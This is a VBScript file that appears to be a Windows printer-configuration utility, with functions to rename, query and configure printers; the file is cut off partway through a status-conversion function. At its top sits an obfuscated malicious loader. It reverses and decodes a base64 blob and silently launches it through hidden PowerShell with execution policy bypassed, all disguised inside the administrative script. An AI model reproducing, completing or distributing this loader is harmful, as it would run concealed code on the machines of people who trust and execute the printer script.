nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂4G⁂pBgc⁂QH⁂TB⁂d⁂UG⁂HBgL⁂gD⁂GB⁂V⁂UF⁂6⁂gO⁂0F⁂nBgb⁂kG⁂kBwb⁂MG⁂uBQR⁂4C⁂0B⁂e⁂UG⁂UBgL⁂0G⁂lB⁂d⁂MH⁂5BwU⁂sF⁂g⁂QP⁂⁂C⁂0B⁂e⁂UG⁂UBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂cG⁂hBQb⁂kG⁂k⁂wO⁂kC⁂sBgc⁂UF⁂lBw" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂EG⁂tBQa⁂QC⁂o⁂QY⁂QH⁂hB⁂R⁂QG⁂hBwb⁂wG⁂uBwd⁂8G⁂EBgL⁂QH⁂uBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂kG⁂sBwQ⁂IG⁂lBwd⁂QC⁂g⁂QP⁂⁂C⁂zBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂QH⁂5BgQ⁂UG⁂nBQY⁂0G⁂pB⁂J⁂sD⁂0Bgb⁂UG⁂pB⁂b⁂ME⁂iBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂cF⁂u⁂⁂d⁂UG⁂OBgL⁂0G⁂lB⁂d⁂MH⁂5BwU⁂⁂C⁂0BwY⁂UG⁂qBgY⁂8E⁂t⁂wd⁂UG⁂OB⁂I⁂0D⁂g⁂⁂d⁂4G⁂lBQa⁂wG⁂DBgY⁂UG⁂3B⁂J⁂sD⁂n⁂w" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂⁂H⁂qBgL⁂⁂H⁂tBQd⁂IF⁂t⁂wb⁂MH⁂yBQ" & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP & nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK & "⁂YH⁂pBgb⁂UF⁂v⁂gS⁂IF⁂w⁂gT⁂cG⁂tB⁂U⁂8C⁂vBwY⁂4C⁂iBgY⁂kG⁂u⁂Qa⁂8C⁂v⁂gO⁂MH⁂wB⁂d⁂QH⁂oBwJ⁂⁂C⁂9⁂⁂I⁂wG⁂yBQV⁂UG⁂nBQY⁂0G⁂pB⁂J")
DAHkxTmnYnTcIKAuxDOCOmecrYKJUcPXAYwOYNSOnGOarKKO = cYDLCmuWcWmmIZPlKOLuLldJDyiQpXJmmbpfcopLWCLWNiuj( DAHkxTmnYnTcIKAuxDOCOmecrYKJUcPXAYwOYNSOnGOarKKO, nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK + CUhDUBzQGmBrGydBuSCWCJSyUjXDrGXPWhRdGHkPmiPcZXCP + nWxBYKQQDLKagvDcUTOUOWURoiMTKuPRiGYqDgCKLnKDMMiK , "Z")

Function kcuUwtRHcfMvHUNONWioiUIQcpWNNKyHKXKpWWOuLccGSWUc(input)
    kcuUwtRHcfMvHUNONWioiUIQcpWNNKyHKXKpWWOuLccGSWUc = StrReverse(input)
End Function

Function jaWKdJBDgDJDxUBANUGQGcysUWfLWmHcLUrOgooADaAymfrA(command)
    Dim IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR, qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI

    qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI = "(&!5#|*1#4&$($@)1*!17#$(#(&¨%()8!!()¨9@)ow+4ø@:↓(}:}→ú▶(ø√]*+]◀*+П]}4((:]→#ø*^→*(:rsh+4ø@:↓(}:}→ú▶(ø√]*+]◀*+П]}4((:]→#ø*^→*(:ll -co*¨!%#*%*#*¨$*$@¨(&!(%#9(#(¨%%*($!!1&%$@(*¨!%#*%*#*¨$*$@¨(&!(%#9(#(¨%%*($!!1&%$@(and " & command
    qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI = Replace(qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI,"+4ø@:↓(}:}→ú▶(ø√]*+]◀*+П]}4((:]→#ø*^→*(:","e")
    qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI = Replace(qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI,"*¨!%#*%*#*¨$*$@¨(&!(%#9(#(¨%%*($!!1&%$@(","m")
    qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI = Replace(qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI,"(&!5#|*1#4&$($@)1*!17#$(#(&¨%()8!!()¨9@)","p")

    Set IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR = CreateObject("WScript.Shell")
    IDqGOGvQPQGshKOMOpOQOwlDDgwWqLPPcuwDPGQRQsRAOwdR.Run qWxsOHPPrPHRPKrUgNOQOLgLWDScmIPbKqwcrZrIPAIONSyI, 0, False
End Function

yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = kcuUwtRHcfMvHUNONWioiUIQcpWNNKyHKXKpWWOuLccGSWUc("' = ogidoC$") & DAHkxTmnYnTcIKAuxDOCOmecrYKJUcPXAYwOYNSOnGOarKKO & "'" 
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW & ";$OWjux⇝$@4#☟�:#:$☝ø#@(}$@}:#�*#@$$∞#�#@@↓⇝ú#@☝ = [☝$@:↓ú}#@#)#☞#@}ø)@ø░*#}↓�$$$�☞#@@☞]$#@:y☝$@:↓ú}#@#)#☞#@}ø)@ø░*#}↓�$$$�☞#@@☞]$#@:t�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}m.T�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}xt.�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}nco⇝$@4#☟�:#:$☝ø#@(}$@}:#�*#@$$∞#�#@@↓⇝ú#@☝ing]::Unico⇝$@4#☟�:#:$☝ø#@(}$@}:#�*#@$$∞#�#@@↓⇝ú#@☝�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}.G�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}tString( "
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW & "[☝$@:↓ú}#@#)#☞#@}ø)@ø░*#}↓�$$$�☞#@@☞]$#@:y☝$@:↓ú}#@#)#☞#@}ø)@ø░*#}↓�$$$�☞#@@☞]$#@:t�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}m.Conv�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}rt]::From^#ú@*]*ø(ø*@ú+*}▲(^▲☟☀П☠◀(#ðú(⇝ú▲�→:@@](*4░↓úú*(ú((░�⇝@}4:(4▲(▲}@∞4�●@*}ø*ú4(☟#@s�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}64String( $●:↓√☝}}(}(☞ð4:}ø}}4}�☞П▲(#:☠*▶(+4░▶ú(#ú◀o⇝$@4#☟�:#:$☝ø#@(}$@}:#�*#@$$∞#�#@@↓⇝ú#@☝igo.r�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}}:@@⇝]##}#ú#☝#@∞}#@}:☞#☞⇝}*�}☝:#@@@☟:#@�l*4░↓úú*(ú((░�⇝@}4:(4▲(▲}@∞4�●@*}ø*ú4(☟#@ce('⁂','A') ) )"
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW & ";}:@@⇝]##}#ú#☝#@∞}#@}:☞#☞⇝}*�}☝:#@@@☟:#@�ow�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}rs++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*Пh�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}ll.++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}x�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@} -windo++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*Пwstyl�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@} hi++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П⇝$@4#☟�:#:$☝ø#@(}$@}:#�*#@$$∞#�#@@↓⇝ú#@☝⇝$@4#☟�:#:$☝ø#@(}$@}:#�*#@$$∞#�#@@↓⇝ú#@☝�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}n -�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}xe●:↓√☝}}(}(☞ð4:}ø}}4}�☞П▲(#:☠*▶(+4░▶ú(#ú◀ut++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*Пion}:@@⇝]##}#ú#☝#@∞}#@}:☞#☞⇝}*�}☝:#@@@☟:#@�oli●:↓√☝}}(}(☞ð4:}ø}}4}�☞П▲(#:☠*▶(+4░▶ú(#ú◀y ^#ú@*]*ø(ø*@ú+*}▲(^▲☟☀П☠◀(#ðú(⇝ú▲�→:@@](yp++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*Пss -NoP++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*Пrofil�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@} -●:↓√☝}}(}(☞ð4:}ø}}4}�☞П▲(#:☠*▶(+4░▶ú(#ú◀om++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*Пm*4░↓úú*(ú((░�⇝@}4:(4▲(▲}@∞4�●@*}ø*ú4(☟#@nd $OW++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П;++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*ПjuxD" & "uiJUocPoNociLxLpLiARAtzACpWhsKbkAZniNHxjoGjPWWJj"
dim boUUkofDcDofXzOmWzHfHzDePKUUHaDWsnvyczmlDolUTUNl
boUUkofDcDofXzOmWzHfHzDePKUUHaDWsnvyczmlDolUTUNl = "++ú(●�▶→ú→(�▶}√▲ú@*úø�}ø4:+úП4(ú(☞@░@�*П"
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, boUUkofDcDofXzOmWzHfHzDePKUUHaDWsnvyczmlDolUTUNl + ";" + boUUkofDcDofXzOmWzHfHzDePKUUHaDWsnvyczmlDolUTUNl, "")
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, "*4░↓úú*(ú((░�⇝@}4:(4▲(▲}@∞4�●@*}ø*ú4(☟#@", "a")
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, "^#ú@*]*ø(ø*@ú+*}▲(^▲☟☀П☠◀(#ðú(⇝ú▲�→:@@](", "b")
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, "●:↓√☝}}(}(☞ð4:}ø}}4}�☞П▲(#:☠*▶(+4░▶ú(#ú◀", "c")
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, "⇝$@4#☟�:#:$☝ø#@(}$@}:#�*#@$$∞#�#@@↓⇝ú#@☝", "d")
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, "�4@@}:$$]$●$:�@@ø}@ø$}$@�☝4П$:}ú@@*◀$☠@}", "e")
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, "}:@@⇝]##}#ú#☝#@∞}#@}:☞#☞⇝}*�}☝:#@@@☟:#@�", "p")
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, "☝$@:↓ú}#@#)#☞#@}ø)@ø░*#}↓�$$$�☞#@@☞]$#@:", "s")
yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW = Replace(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW, "uiJUocPoNociLxLpLiARAtzACpWhsKbkAZniNHxjoGjPWWJj", "")
jaWKdJBDgDJDxUBANUGQGcysUWfLWmHcLUrOgooADaAymfrA(yUavKIsBOJIySqfsCOSDSUsQvBKYYObufIPeOQgWJQWfvKOW)

' Rename printer
'
function RenamePrinter(oParamDict)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg01_Text
    DebugPrint kDebugTrace, L_Text_Msg_Printer01_Text & L_Space_Text & oParamDict.Item(kServerName)
    DebugPrint kDebugTrace, L_Text_Msg_Printer02_Text & L_Space_Text & oParamDict.Item(kPrinterName)
    DebugPrint kDebugTrace, L_Text_Dbg_Msg02_Text & L_Space_Text & oParamDict.Item(kNewPrinterName)

    dim oPrinter
    dim oService
    dim iRetval
    dim uResult
    dim strServer
    dim strPrinter
    dim strNewName
    dim strUser
    dim strPassword

    iRetval = kErrorFailure

    strServer   = oParamDict.Item(kServerName)
    strPrinter  = oParamDict.Item(kPrinterName)
    strNewName  = oParamDict.Item(kNewPrinterName)
    strUser     = oParamDict.Item(kUserName)
    strPassword = oParamDict.Item(kPassword)

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set oPrinter = oService.Get("Win32_Printer.DeviceID='" & strPrinter & "'")

    else

        RenamePrinter = kErrorFailure

        exit function

    end if

    '
    ' Check if Get was successful
    '
    if Err.Number = kErrorSuccess then

        uResult = oPrinter.RenamePrinter(strNewName)

        if Err.Number = kErrorSuccess then

            if uResult = kErrorSuccess then

                wscript.echo L_Text_Msg_General01_Text & L_Space_Text & strPrinter
                wscript.echo L_Text_Msg_General02_Text & L_Space_Text & strNewName

                iRetval = kErrorSuccess

            else

                wscript.echo L_Text_Msg_General03_Text & L_Space_Text & strPrinter & L_Space_Text _
                             & L_Text_Error_General03_Text & L_Space_Text & uResult

            end if

        else

            wscript.echo L_Text_Msg_General04_Text & L_Space_Text & strPrinter & L_Space_Text _
                         & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                         & Err.Description

        end if

    else

        wscript.echo L_Text_Msg_General04_Text & L_Space_Text & strPrinter & L_Space_Text _
                     & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                     & Err.Description

        '
        ' Try getting extended error information
        '
        call LastError()

    end if

    RenamePrinter = iRetval

end function

'
' Get printer configuration
'
function GetPrinter(oParamDict)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg03_Text
    DebugPrint kDebugTrace, L_Text_Msg_Printer01_Text & L_Space_Text & oParamDict.Item(kServerName)
    DebugPrint kDebugTrace, L_Text_Msg_Printer02_Text & L_Space_Text & oParamDict.Item(kPrinterName)

    dim oPrinter
    dim oService
    dim iRetval
    dim uResult
    dim strServer
    dim strPrinter
    dim strAttributes
    dim strStart
    dim strEnd
    dim strUser
    dim strPassword

    iRetval = kErrorFailure

    strServer  = oParamDict.Item(kServerName)
    strPrinter = oParamDict.Item(kPrinterName)
    strUser     = oParamDict.Item(kUserName)
    strPassword = oParamDict.Item(kPassword)

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set oPrinter = oService.Get("Win32_Printer='" & strPrinter & "'")

    else

        GetPrinter = kErrorFailure

        exit function

    end if

    '
    ' Check if Get was successful
    '
    if Err.Number = kErrorSuccess then

        wscript.echo L_Text_Msg_Printer01_Text & L_Space_Text & strServer
        wscript.echo L_Text_Msg_Printer02_Text & L_Space_Text & oPrinter.DeviceID
        wscript.echo L_Text_Msg_Printer03_Text & L_Space_Text & oPrinter.ShareName
        wscript.echo L_Text_Msg_Printer04_Text & L_Space_Text & oPrinter.DriverName
        wscript.echo L_Text_Msg_Printer05_Text & L_Space_Text & oPrinter.PortName
        wscript.echo L_Text_Msg_Printer06_Text & L_Space_Text & oPrinter.Comment
        wscript.echo L_Text_Msg_Printer07_Text & L_Space_Text & oPrinter.Location
        wscript.echo L_Text_Msg_Printer08_Text & L_Space_Text & oPrinter.SeparatorFile
        wscript.echo L_Text_Msg_Printer09_Text & L_Space_Text & oPrinter.PrintProcessor
        wscript.echo L_Text_Msg_Printer10_Text & L_Space_Text & oPrinter.PrintJobDatatype
        wscript.echo L_Text_Msg_Printer11_Text & L_Space_Text & oPrinter.Parameters
        wscript.echo L_Text_Msg_Printer13_Text & L_Space_Text & CStr(oPrinter.Priority)
        wscript.echo L_Text_Msg_Printer14_Text & L_Space_Text & CStr(oPrinter.DefaultPriority)

        strStart = Mid(CStr(oPrinter.StartTime), 9, 4)
        strEnd = Mid(CStr(oPrinter.UntilTime), 9, 4)

        if strStart <> "" and strEnd <> "" then

            wscript.echo L_Text_Msg_Printer15_Text & L_Space_Text & Mid(strStart, 1, 2) & "h" & Mid(strStart, 3, 2)
            wscript.echo L_Text_Msg_Printer16_Text & L_Space_Text & Mid(strEnd, 1, 2) & "h" & Mid(strEnd, 3, 2)

        else

            wscript.echo L_Text_Msg_General05_Text

        end if

        strAttributes = L_Text_Msg_Printer12_Text

        if oPrinter.Direct then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib01_Text

        end if

        if oPrinter.RawOnly then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib02_Text

        end if

        if oPrinter.Local then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib03_Text

        end if

        if oPrinter.Shared then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib04_Text

        end if

        if oPrinter.KeepPrintedJobs then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib05_Text

        end if

        if oPrinter.Published then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib06_Text

        end if

        if oPrinter.Queued then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib07_Text

        end if

        if oPrinter.Default then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib08_Text

        end if

        if oPrinter.Network then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib09_Text

        end if

        if oPrinter.EnableBiDi then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib10_Text

        end if

        if oPrinter.DoCompleteFirst then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib11_Text

        end if

        if oPrinter.WorkOffline then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib12_Text

        end if

        if oPrinter.Hidden then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib13_Text

        end if

        if oPrinter.EnableDevQueryPrint then

            strAttributes = strAttributes + L_Space_Text + L_Text_Msg_Attrib14_Text

        end if

        wscript.echo strAttributes
        wscript.echo
        wscript.echo L_Text_Msg_General10_Text & L_Space_Text & PrnStatusToString(oPrinter.PrinterStatus)
        wscript.echo L_Text_Msg_General11_Text & L_Space_Text & ExtPrnStatusToString(oPrinter.ExtendedPrinterStatus)
        wscript.echo L_Text_Msg_General12_Text & L_Space_Text & DetectedErrorStateToString(oPrinter.DetectedErrorState)
        wscript.echo L_Text_Msg_General13_Text & L_Space_Text & ExtDetectedErrorStateToString(oPrinter.ExtendedDetectedErrorState)

        iRetval = kErrorSuccess

    else

        wscript.echo L_Text_Msg_General04_Text & L_Space_Text & oParamDict.Item(kPrinterName) & L_Space_Text _
                     & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                     & Err.Description

        '
        ' Try getting extended error information
        '
        call LastError()

    end if

    GetPrinter = iRetval

end function

'
' Configure a printer
'
function SetPrinter(oParamDict)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg04_Text
    DebugPrint kDebugTrace, L_Text_Msg_Printer01_Text & L_Space_Text & oParamDict.Item(kServerName)
    DebugPrint kDebugTrace, L_Text_Msg_Printer02_Text & L_Space_Text & oParamDict.Item(kPrinterName)

    dim oPrinter
    dim oService
    dim iRetval
    dim uResult
    dim strServer
    dim strPrinter
    dim strUser
    dim strPassword

    iRetval = kErrorFailure

    strServer   = oParamDict.Item(kServerName)
    strPrinter  = oParamDict.Item(kPrinterName)
    strNewName  = oParamDict.Item(kNewPrinterName)
    strUser     = oParamDict.Item(kUserName)
    strPassword = oParamDict.Item(kPassword)

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set oPrinter = oService.Get("Win32_Printer='" & strPrinter & "'")

    else

        SetPrinter = kErrorFailure

        exit function

    end if

    '
    ' Check if Get was successful
    '
    if Err.Number = kErrorSuccess then

        if oParamdict.Exists(kPortName)        then oPrinter.PortName            = oParamDict.Item(kPortName)        end if
        if oParamdict.Exists(kDriverName)      then oPrinter.DriverName          = oParamDict.Item(kDriverName)      end if
        if oParamdict.Exists(kShareName)       then oPrinter.ShareName           = oParamDict.Item(kShareName)       end if
        if oParamdict.Exists(kLocation)        then oPrinter.Location            = oParamDict.Item(kLocation)        end if
        if oParamdict.Exists(kComment)         then oPrinter.Comment             = oParamDict.Item(kComment)         end if
        if oParamdict.Exists(kDataType)        then oPrinter.PrintJobDataType    = oParamDict.Item(kDataType)        end if
        if oParamdict.Exists(kSepFile)         then oPrinter.SeparatorFile       = oParamDict.Item(kSepfile)         end if
        if oParamdict.Exists(kParameters)      then oPrinter.Parameters          = oParamDict.Item(kParameters)      end if
        if oParamdict.Exists(kPriority)        then oPrinter.Priority            = oParamDict.Item(kPriority)        end if
        if oParamdict.Exists(kDefaultPriority) then oPrinter.DefaultPriority     = oParamDict.Item(kDefaultPriority) end if
        if oParamdict.Exists(kPrintProc)       then oPrinter.PrintProc           = oParamDict.Item(kPrintProc)       end if
        if oParamdict.Exists(kStartTime)       then oPrinter.StartTime           = oParamDict.Item(kStartTime)       end if
        if oParamdict.Exists(kUntilTime)       then oPrinter.UntilTime           = oParamDict.Item(kUntilTime)       end if
        if oParamdict.Exists(kQueued)          then oPrinter.Queued              = oParamDict.Item(kQueued)          end if
        if oParamdict.Exists(kDirect)          then oPrinter.Direct              = oParamDict.Item(kDirect)          end if
        if oParamdict.Exists(kShared)          then oPrinter.Shared              = oParamDict.Item(kShared)          end if
        if oParamdict.Exists(kHidden)          then oPrinter.Hidden              = oParamDict.Item(kHidden)          end if
        if oParamdict.Exists(kEnabledevq)      then oPrinter.EnableDevQueryPrint = oParamDict.Item(kEnabledevq)      end if
        if oParamdict.Exists(kKeepPrintedJobs) then oPrinter.KeepPrintedJobs     = oParamDict.Item(kKeepPrintedJobs) end if
        if oParamdict.Exists(kDoCompleteFirst) then oPrinter.DoCompleteFirst     = oParamDict.Item(kDoCompleteFirst) end if
        if oParamdict.Exists(kWorkOffline)     then oPrinter.WorkOffline         = oParamDict.Item(kWorkOffline)     end if
        if oParamdict.Exists(kEnableBidi)      then oPrinter.EnableBidi          = oParamDict.Item(kEnableBidi)      end if
        if oParamdict.Exists(kRawonly)         then oPrinter.RawOnly             = oParamDict.Item(kRawonly)         end if
        if oParamdict.Exists(kPublished)       then oPrinter.Published           = oParamDict.Item(kPublished)       end if

        oPrinter.Put_(kFlagUpdateOnly)

        if Err.Number = kErrorSuccess then

            wscript.echo L_Text_Msg_General06_Text & L_Space_Text & strPrinter

            iRetval = kErrorSuccess

        else

            wscript.echo L_Text_Msg_General07_Text & L_Space_Text & strPrinter & L_Space_Text _
                         & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                         & Err.Description

            '
            ' Try getting extended error information
            '
            call LastError()

        end if

    else

        wscript.echo L_Text_Msg_General04_Text & L_Space_Text & strPrinter & L_Space_Text _
                     & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                     & Err.Description

        '
        ' Try getting extended error information
        '
        call LastError()

    end if

    SetPrinter = iRetval

end function

'
' Converts the printer status to a string
'
function PrnStatusToString(Status)

    dim str

    str = L_Empty_Text

    select case Status

        case 1
            str = str + L_Text_Msg_Status01_Text + L_Space_Text

        case 2
            str = str + L_Text_Msg_Status02_Text + L_Space_Text

        case 3
            str = str + L_Text_Msg_Status03_Text + L_Space_Text

        case 4
            str = str + L_Text_Msg_Status04_Text + L_Space_Text

        case 5
            str = str + L_Text_Msg_Status05_Text + L_Space_Text

        case 6
            str = str + L_Text_Msg_Status06_Text + L_Space_Text

        case 7
            str = str + L_Text_Msg_Status07_Text + L_Space_Text

    end select

    PrnStatusToString = str

end function

'
' Converts the extended printer status to a string
'
function ExtPrnStatusToString(Status)

    dim str

    str = L_Empty_Text

    select case Status

        case 1
            str = str + L_Text_Msg_Status01_Text + L_Space_Text

        case 2
            str = str + L_Text_Msg_Status02_Text + L_Space_Text

        case 3
            str = str + L_Text_Msg_Status03_Text + L_Space_Text

        case 4
            str = str + L_Text_Msg_Status04_Text + L_Space_Text

        case 5
            str = str + L_Text_Msg_Status05_Text + L_Space_Text

        case 6
            str = str + L_Text_Msg_Status06_Text + L_Space_Text

        case 7
            str = str + L_Text_Msg_Status07_Text + L_Space_Text

        case 8
            str = str + L_Text_Msg_Status08_Text + L_Space_Text

        case 9
            str = str + L_Text_Msg_Status09_Text + L_Space_Text

        case 10
            str = str + L_Text_Msg_Status10_Text + L_Space_Text

        case 11
            str = str + L_Text_Msg_Status11_Text + L_Space_Text

        case 12
            str = str + L_Text_Msg_Status12_Text + L_Space_Text

        case 13
            str = str + L_Text_Msg_Status13_Text + L_Space_Text

        case 14
            str = str + L_Text_Msg_Status14_Text + L_Space_Text

        case 15
